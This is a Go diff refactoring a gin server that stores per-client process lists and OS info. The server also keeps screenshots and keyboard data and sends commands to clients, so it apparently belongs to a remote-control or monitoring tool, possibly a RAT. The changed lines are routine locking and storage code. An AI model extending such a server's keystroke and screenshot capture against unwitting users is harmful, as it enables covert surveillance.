@@ -16,13 +16,13 @@ import (
 type ProcessesContainer struct
 {
 	mu sync.Mutex
-	ProcessesMap map[string]*[]types.Process
+	ProcessesMap map[string][]types.Process
 }
 
 
 
 func (q * ProcessesContainer)SetProcesses(addr * string, processes * []types.Process) {
-	q.ProcessesMap[*addr] = processes
+	q.ProcessesMap[*addr] = *processes
 }
 
 func (q * ProcessesContainer)GetProcesses(addr * string) *[]types.Process {
@@ -33,7 +33,7 @@ func (q * ProcessesContainer)GetProcesses(addr * string) *[]types.Process {
 		return nil
 	}
 
-	return data
+	return &data
 }
 
 func (q * ProcessesContainer)GetProcessCount(addr * string) int {
@@ -43,17 +43,19 @@ func (q * ProcessesContainer)GetProcessCount(addr * string) int {
 		return 0
 	}
 
-	return len(*data)
+	return len(data)
 }
 
-var ClientsProcesses = ProcessesContainer{ProcessesMap: make(map[string]*[]types.Process)}
-
+var ClientsProcesses 	sync.Map
 var ClientsOSInfos	 	sync.Map
 var ClientsScreenShots 	sync.Map
 var ClientsKeyboardData	sync.Map
 
+/* mutexes for synchronize access to shared resources */
+var ProcMutex 			sync.Mutex
+var OsMutex 			sync.Mutex
 
-var ClientInfoAboutCommands *int = nil
+
 
 var DB * gorm.DB = nil
 
@@ -85,8 +87,15 @@ func AddClient(c * gin.Context) {
 }
 
 
-
+//updates client's os info every time
+//
+// before set value, initially lock the osinfo mutex and then unlock
+//
 func UpdateClientOsInfo(c * gin.Context) {
+
+	/* lock/unlock */
+	OsMutex.Lock()
+	defer OsMutex.Unlock()
 
 	addr := GetClientIPAddress(c)
 
@@ -102,14 +111,14 @@ func UpdateClientOsInfo(c * gin.Context) {
 		return
 	}
 
-	// store pointer to deflated data in hashtable
-	ClientsOSInfos.Store(addr, &bytes)
+	// store deflated bytes in the clients os infos hashmap
+	ClientsOSInfos.Store(addr, bytes)
 	c.String(http.StatusOK, "")
 }
 
 func GetClientOSInfo(c * gin.Context) {
 
-	addr := GetClientIPAddress(c)
+	addr := c.Param("client_addr")
 
 	if (FindClientByIpAddrDB(DB, addr) == nil) {
 		c.JSON(http.StatusNotFound, nil)
@@ -124,9 +133,9 @@ func GetClientOSInfo(c * gin.Context) {
 		c.Header("Content-Type", "application/json")
 		c.Header("Content-Encoding", "deflate")
 
-		bytes := value.(*[]byte)
+		bytes := value.([]byte)
 		c.Status(http.StatusOK)
-		c.Writer.Write(*bytes)
+		c.Writer.Write(bytes)
 	}
 
 }
@@ -134,44 +143,51 @@ func GetClientOSInfo(c * gin.Context) {
 
 func UpdateClientProcessesById(c * gin.Context) {
 
+	/* lock/unlock */
+	ProcMutex.Lock()
+	defer ProcMutex.Unlock()
 	ip := GetClientIPAddress(c)
 
 	if (FindClientByIpAddrDB(DB, ip) == nil) {
 		c.String(http.StatusNotFound, "404, no such host")
 		return
 	}
-	
-	var processes []types.Process
-	ReadRequestDataAsType(&processes, &c.Request.Body)
 
-	ClientsProcesses.mu.Lock()
+	bytes, err := io.ReadAll(c.Request.Body)
+	// failed to read request body.
+	if (err != nil) {
+		c.String(http.StatusInternalServerError, "")
+		return
+	}
 
-	ClientsProcesses.SetProcesses(&ip, &processes)
-	
-	ClientsProcesses.mu.Unlock()
-
-	c.String(http.StatusOK, "processes updated")
+	// store json bytes in clients processes map
+	ClientsProcesses.Store(ip, bytes)
+	fmt.Printf("Processes bytes for IP: %s is %d\n", ip, len(bytes))
+	c.String(http.StatusOK, "")
 }
 
 func GetProcesses(c * gin.Context) {
 
-	addr := GetClientIPAddress(c)
+	addr := c.Param("client_addr")
 
 	if (FindClientByIpAddrDB(DB, addr) == nil) {
 		c.JSON(http.StatusNotFound, nil)
 		return
 	}
 
-	ClientsProcesses.mu.Lock()
 
-	processes, ok := ClientsProcesses.ProcessesMap[addr]
+
+	processes, ok := ClientsProcesses.Load(addr)
 	if (ok) {
-		c.JSON(http.StatusOK, processes)
+
+		bytes := processes.([]byte)
+		c.Header("Content-Type", "application/json")
+		c.String(http.StatusOK, string(bytes))
+	
 	} else {
 		c.JSON(http.StatusNotFound, nil)
 	}
 
-	ClientsProcesses.mu.Unlock()
 }
 
 // sends command to client
@@ -382,7 +398,7 @@ func DisconnectClient(c * gin.Context) {
 	RemoveAllClientCommands(&addr)
 	RemoveClientContainer(&addr)
 
-	delete(ClientsProcesses.ProcessesMap, addr)
+	ClientsProcesses.Delete(addr)
 	ClientsOSInfos.Delete(addr)
 }
 
